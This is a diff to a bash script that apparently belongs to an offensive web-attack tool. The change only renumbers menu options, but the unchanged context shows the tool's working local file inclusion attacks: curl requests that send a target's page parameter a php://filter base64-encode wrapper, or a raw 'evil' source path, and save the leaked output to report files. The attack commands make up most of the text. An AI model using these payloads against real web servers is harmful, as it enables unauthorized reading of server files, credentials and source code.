@@ -29,8 +29,8 @@ echo -e "\e[1;32msave file:\e[0m"
 read save
 echo -e "\e[1;32m[1]. filter base64.\e[0m"
 echo -e "\e[1;32m[2]. source attack.\e[0m"
-echo -e "\e[1;32m[2]. restart.\e[0m"
-echo -e "\e[1;32m[2]. back.\e[0m"
+echo -e "\e[1;32m[3]. restart.\e[0m"
+echo -e "\e[1;32m[4]. back.\e[0m"
 echo -e "\e[1;32m1. Choice.\e[0m"
 read choice
 
@@ -38,8 +38,8 @@ echo $choice
 case $choice in
      1) curl $ip/$page=php://filter/convert.base64-encode/resource=$evil > /usr/share/wasp/report/$save.txt ;;
      2) curl $ip/$page=$evil > /usr/share/wasp/report/$save.txt ;;
-     2) /usr/share/wasp/curlwsp.sh ;;
-     3) wasp ;;
+     3) /usr/share/wasp/curlwsp.sh ;;
+     4) wasp ;;
      *) echo; echo "Invalid choice."; echo
 esac
 
